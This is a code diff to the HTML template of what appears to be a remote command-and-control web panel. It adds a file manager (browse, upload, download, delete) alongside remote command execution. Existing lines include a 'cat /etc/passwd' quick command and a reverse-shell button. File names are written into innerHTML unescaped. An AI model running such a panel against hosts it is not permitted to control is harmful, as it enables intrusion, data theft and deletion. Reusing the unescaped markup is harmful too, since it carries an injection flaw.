@@ -260,6 +260,144 @@
         .status.offline {
             color: #f85149;
         }
+        
+        /* 文件管理样式 */
+        .tabs {
+            width: 100%;
+        }
+        
+        .tab-header {
+            display: flex;
+            background-color: #30363d;
+            border-radius: 8px 8px 0 0;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        
+        .tab-item {
+            padding: 15px 20px;
+            cursor: pointer;
+            color: #8b949e;
+            font-weight: bold;
+            text-align: center;
+            flex: 1;
+        }
+        
+        .tab-item.active {
+            background-color: #238636;
+            color: white;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .file-manager {
+            background: #21262d;
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid #30363d;
+        }
+        
+        .file-manager-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .file-path-nav {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+        
+        .path-input {
+            padding: 10px;
+            border: 1px solid #30363d;
+            border-radius: 4px;
+            background: #0d1117;
+            color: #c9d1d9;
+            width: 300px;
+        }
+        
+        .file-upload-section {
+            margin-bottom: 20px;
+            padding: 15px;
+            background: #161b22;
+            border-radius: 6px;
+            border: 1px solid #30363d;
+        }
+        
+        .file-upload-section h3 {
+            margin-bottom: 10px;
+            color: #58a6ff;
+        }
+        
+        .file-list-section {
+            margin-top: 20px;
+        }
+        
+        .file-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+        }
+        
+        .file-table th,
+        .file-table td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #30363d;
+        }
+        
+        .file-table th {
+            background: #161b22;
+            color: #f0f6fc;
+            font-weight: 600;
+        }
+        
+        .file-table tr:hover {
+            background: #161b22;
+        }
+        
+        .file-actions {
+            display: flex;
+            gap: 5px;
+        }
+        
+        .file-icon {
+            margin-right: 5px;
+        }
+        
+        .directory {
+            color: #58a6ff;
+            cursor: pointer;
+        }
+        
+        .directory:hover {
+            text-decoration: underline;
+        }
+        
+        .loading-indicator {
+            text-align: center;
+            padding: 20px;
+            color: #8b949e;
+            font-style: italic;
+        }
+        
+        .download-link {
+            color: #58a6ff;
+            text-decoration: none;
+        }
+        
+        .download-link:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
@@ -343,73 +481,150 @@
             </div>
 
             <div class="command-and-results">
-                <div class="command-section">
-                    <h2>命令执行</h2>
-                    
-                    <div class="quick-commands">
-                        <button class="quick-cmd" onclick="setCommand('whoami')">whoami</button>
-                        <button class="quick-cmd" onclick="setCommand('pwd')">pwd</button>
-                        <button class="quick-cmd" onclick="setCommand('ls -la')">ls -la</button>
-                        <button class="quick-cmd" onclick="setCommand('ps aux')">ps aux</button>
-                        <button class="quick-cmd" onclick="setCommand('netstat -an')">netstat -an</button>
-                        <button class="quick-cmd" onclick="setCommand('uname -a')">uname -a</button>
-                        <button class="quick-cmd" onclick="setCommand('cat /etc/passwd')">cat /etc/passwd</button>
+                <div class="tabs">
+                    <div class="tab-header">
+                        <div class="tab-item active" data-tab="command">命令执行</div>
+                        <div class="tab-item" data-tab="file">文件管理</div>
                     </div>
-
-                    <div class="command-form">
-                        <input type="text" id="commandInput" class="command-input" placeholder="输入要执行的命令..." />
-                        <button class="btn btn-primary" onclick="executeCommand()">执行</button>
-                        <button class="btn btn-danger" onclick="startReverseShell()">反弹Shell</button>
-                    </div>
-                </div>
-
-                <div class="results-section">
-                    <h2>命令执行结果</h2>
-                    <button class="btn refresh-btn" onclick="refreshResults()">刷新</button>
                     
-                    {% if commands.is_empty() %}
-                        <div class="no-results">
-                            <h3>暂无命令执行记录</h3>
-                            <p>执行命令后，结果将显示在这里</p>
+                    <div class="tab-content active" id="command-tab">
+                        <div class="command-section">
+                            <h2>命令执行</h2>
+                            
+                            <div class="quick-commands">
+                                <button class="quick-cmd" onclick="setCommand('whoami')">whoami</button>
+                                <button class="quick-cmd" onclick="setCommand('pwd')">pwd</button>
+                                <button class="quick-cmd" onclick="setCommand('ls -la')">ls -la</button>
+                                <button class="quick-cmd" onclick="setCommand('ps aux')">ps aux</button>
+                                <button class="quick-cmd" onclick="setCommand('netstat -an')">netstat -an</button>
+                                <button class="quick-cmd" onclick="setCommand('uname -a')">uname -a</button>
+                                <button class="quick-cmd" onclick="setCommand('cat /etc/passwd')">cat /etc/passwd</button>
+                            </div>
+
+                            <div class="command-form">
+                                <input type="text" id="commandInput" class="command-input" placeholder="输入要执行的命令..." />
+                                <button class="btn btn-primary" onclick="executeCommand()">执行</button>
+                                <button class="btn btn-danger" onclick="startReverseShell()">反弹Shell</button>
+                            </div>
                         </div>
-                    {% else %}
-                        <table class="results-table">
-                            <thead>
-                                <tr>
-                                    <th>命令</th>
-                                    <th>执行时间</th>
-                                    <th>结果</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                {% for cmd in commands %}
-                                <tr>
-                                    <td>{{ cmd.command }}</td>
-                                    <td>{{ cmd.executed_at.format("%Y-%m-%d %H:%M:%S") }}</td>
-                                    <td>
-                                        <div class="result-output">
-                                            {% if !cmd.stdout.is_empty() %}
-                                                <div class="output-stdout">{{ cmd.stdout }}</div>
-                                            {% endif %}
-                                            {% if !cmd.stderr.is_empty() %}
-                                                <div class="output-stderr">{{ cmd.stderr }}</div>
-                                            {% endif %}
-                                            <div class="exit-code {% if cmd.exit_code == 0 %}success{% else %}error{% endif %}">
-                                                退出码: {{ cmd.exit_code }}
-                                            </div>
-                                        </div>
-                                    </td>
-                                </tr>
-                                {% endfor %}
-                            </tbody>
-                        </table>
-                    {% endif %}
+
+                        <div class="results-section">
+                            <h2>命令执行结果</h2>
+                            <button class="btn refresh-btn" onclick="refreshResults()">刷新</button>
+                            
+                            {% if commands.is_empty() %}
+                                <div class="no-results">
+                                    <h3>暂无命令执行记录</h3>
+                                    <p>执行命令后，结果将显示在这里</p>
+                                </div>
+                            {% else %}
+                                <table class="results-table">
+                                    <thead>
+                                        <tr>
+                                            <th>命令</th>
+                                            <th>执行时间</th>
+                                            <th>结果</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        {% for cmd in commands %}
+                                        <tr>
+                                            <td>{{ cmd.command }}</td>
+                                            <td>{{ cmd.executed_at.format("%Y-%m-%d %H:%M:%S") }}</td>
+                                            <td>
+                                                <div class="result-output">
+                                                    {% if !cmd.stdout.is_empty() %}
+                                                        <div class="output-stdout">{{ cmd.stdout }}</div>
+                                                    {% endif %}
+                                                    {% if !cmd.stderr.is_empty() %}
+                                                        <div class="output-stderr">{{ cmd.stderr }}</div>
+                                                    {% endif %}
+                                                    <div class="exit-code {% if cmd.exit_code == 0 %}success{% else %}error{% endif %}">
+                                                        退出码: {{ cmd.exit_code }}
+                                                    </div>
+                                                </div>
+                                            </td>
+                                        </tr>
+                                        {% endfor %}
+                                    </tbody>
+                                </table>
+                            {% endif %}
+                        </div>
+                    </div>
+                    
+                    <div class="tab-content" id="file-tab">
+                        <div class="file-manager">
+                            <div class="file-manager-header">
+                                <h2>文件管理</h2>
+                                <div class="file-path-nav">
+                                    <input type="text" id="currentPath" class="path-input" value="/" />
+                                    <button class="btn" onclick="listDirectory()">浏览</button>
+                                    <button class="btn" onclick="goToParentDirectory()">上级目录</button>
+                                </div>
+                            </div>
+                            
+                            <div class="file-upload-section">
+                                <h3>文件上传</h3>
+                                <form id="uploadForm" enctype="multipart/form-data">
+                                    <input type="file" id="fileUpload" />
+                                    <button type="button" class="btn" onclick="uploadFile()">上传</button>
+                                </form>
+                            </div>
+                            
+                            <div class="file-list-section">
+                                <h3>目录内容</h3>
+                                <div class="loading-indicator" id="loadingFiles" style="display: none;">
+                                    加载中...
+                                </div>
+                                <table class="file-table">
+                                    <thead>
+                                        <tr>
+                                            <th>名称</th>
+                                            <th>类型</th>
+                                            <th>大小</th>
+                                            <th>修改时间</th>
+                                            <th>操作</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="fileList">
+                                        <!-- 文件列表将通过JavaScript动态填充 -->
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
+        // Tab切换功能
+        document.addEventListener('DOMContentLoaded', function() {
+            const tabItems = document.querySelectorAll('.tab-item');
+            const tabContents = document.querySelectorAll('.tab-content');
+            
+            tabItems.forEach(item => {
+                item.addEventListener('click', function() {
+                    const tabId = this.getAttribute('data-tab');
+                    
+                    // 移除所有active类
+                    tabItems.forEach(tab => tab.classList.remove('active'));
+                    tabContents.forEach(content => content.classList.remove('active'));
+                    
+                    // 为当前tab添加active类
+                    this.classList.add('active');
+                    document.getElementById(`${tabId}-tab`).classList.add('active');
+                    
+                    // 如果是文件管理标签，自动列出目录
+                    if (tabId === 'file') {
+                        listDirectory();
+                    }
+                });
+            });
+        });
+
+        // 命令执行功能
         function setCommand(command) {
             document.getElementById('commandInput').value = command;
         }
@@ -474,14 +689,218 @@
         }
 
         // 回车键执行命令
-        document.getElementById('commandInput').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                executeCommand();
-            }
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('commandInput').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    executeCommand();
+                }
+            });
+            
+            document.getElementById('currentPath').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    listDirectory();
+                }
+            });
         });
 
-        // 自动刷新结果
-        setInterval(refreshResults, 15000);
+        // 文件管理功能
+        let currentPath = '/';
+        
+        async function listDirectory() {
+            const path = document.getElementById('currentPath').value.trim();
+            if (!path) {
+                alert('请输入有效路径');
+                return;
+            }
+            
+            currentPath = path;
+            document.getElementById('loadingFiles').style.display = 'block';
+            document.getElementById('fileList').innerHTML = '';
+            
+            try {
+                const response = await fetch(`/api/files/list`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        client_id: '{{ client.id }}',
+                        path: path,
+                        recursive: false
+                    })
+                });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    renderFileList(data.entries);
+                } else {
+                    const error = await response.json();
+                    alert(`获取文件列表失败: ${error.message}`);
+                }
+            } catch (error) {
+                alert('获取文件列表时出错: ' + error.message);
+            } finally {
+                document.getElementById('loadingFiles').style.display = 'none';
+            }
+        }
+        
+        function renderFileList(entries) {
+            const fileList = document.getElementById('fileList');
+            fileList.innerHTML = '';
+            
+            if (entries.length === 0) {
+                fileList.innerHTML = '<tr><td colspan="5" class="no-results">目录为空</td></tr>';
+                return;
+            }
+            
+            entries.forEach(entry => {
+                const tr = document.createElement('tr');
+                
+                // 名称列，包含图标
+                const nameCell = document.createElement('td');
+                if (entry.is_dir) {
+                    nameCell.innerHTML = `<span class="file-icon">📁</span>
+                                        <span class="directory" onclick="navigateToDirectory('${entry.path}')">${entry.name}</span>`;
+                } else {
+                    nameCell.innerHTML = `<span class="file-icon">📄</span> ${entry.name}`;
+                }
+                
+                // 类型列
+                const typeCell = document.createElement('td');
+                typeCell.textContent = entry.is_dir ? '目录' : '文件';
+                
+                // 大小列
+                const sizeCell = document.createElement('td');
+                sizeCell.textContent = entry.is_dir ? '-' : formatFileSize(entry.size || 0);
+                
+                // 修改时间列
+                const timeCell = document.createElement('td');
+                timeCell.textContent = entry.modified ? new Date(entry.modified).toLocaleString() : '-';
+                
+                // 操作列
+                const actionCell = document.createElement('td');
+                actionCell.className = 'file-actions';
+                
+                if (entry.is_dir) {
+                    actionCell.innerHTML = `
+                        <button class="btn btn-sm" onclick="navigateToDirectory('${entry.path}')">打开</button>
+                        <button class="btn btn-sm btn-danger" onclick="deletePath('${entry.path}')">删除</button>
+                    `;
+                } else {
+                    actionCell.innerHTML = `
+                        <a href="/api/files/download/${encodeURIComponent(entry.path)}?client_id={{ client.id }}" class="btn btn-sm">下载</a>
+                        <button class="btn btn-sm btn-danger" onclick="deletePath('${entry.path}')">删除</button>
+                    `;
+                }
+                
+                tr.appendChild(nameCell);
+                tr.appendChild(typeCell);
+                tr.appendChild(sizeCell);
+                tr.appendChild(timeCell);
+                tr.appendChild(actionCell);
+                
+                fileList.appendChild(tr);
+            });
+        }
+        
+        function formatFileSize(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+        
+        function navigateToDirectory(path) {
+            document.getElementById('currentPath').value = path;
+            listDirectory();
+        }
+        
+        function goToParentDirectory() {
+            const currentPath = document.getElementById('currentPath').value.trim();
+            if (currentPath === '/' || currentPath === '') {
+                return; // 已经在根目录
+            }
+            
+            const pathParts = currentPath.split('/').filter(Boolean);
+            pathParts.pop(); // 移除最后一个目录
+            const parentPath = pathParts.length === 0 ? '/' : '/' + pathParts.join('/');
+            
+            document.getElementById('currentPath').value = parentPath;
+            listDirectory();
+        }
+        
+        async function deletePath(path) {
+            if (!confirm(`确定要删除 ${path} 吗？`)) {
+                return;
+            }
+            
+            try {
+                const response = await fetch(`/api/files/delete`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        client_id: '{{ client.id }}',
+                        path: path
+                    })
+                });
+                
+                if (response.ok) {
+                    alert('删除成功');
+                    listDirectory(); // 刷新文件列表
+                } else {
+                    const error = await response.json();
+                    alert(`删除失败: ${error.message}`);
+                }
+            } catch (error) {
+                alert('删除时出错: ' + error.message);
+            }
+        }
+        
+        async function uploadFile() {
+            const fileInput = document.getElementById('fileUpload');
+            const currentPath = document.getElementById('currentPath').value.trim();
+            
+            if (!fileInput.files || fileInput.files.length === 0) {
+                alert('请选择要上传的文件');
+                return;
+            }
+            
+            const file = fileInput.files[0];
+            const targetPath = `${currentPath}/${file.name}`.replace(/\/\//g, '/');
+            
+            const formData = new FormData();
+            formData.append('file', file);
+            
+            try {
+                const response = await fetch(`/api/files/upload/${encodeURIComponent(targetPath)}?client_id={{ client.id }}`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (response.ok) {
+                    alert('文件上传成功');
+                    fileInput.value = ''; // 清空文件输入
+                    listDirectory(); // 刷新文件列表
+                } else {
+                    const error = await response.json();
+                    alert(`上传失败: ${error.message}`);
+                }
+            } catch (error) {
+                alert('上传时出错: ' + error.message);
+            }
+        }
+
+        // 自动刷新结果（只在命令执行标签页激活时）
+        setInterval(() => {
+            if (document.querySelector('.tab-item[data-tab="command"]').classList.contains('active')) {
+                refreshResults();
+            }
+        }, 15000);
 
         // 动态更新客户端状态
         function updateClientStatus() {
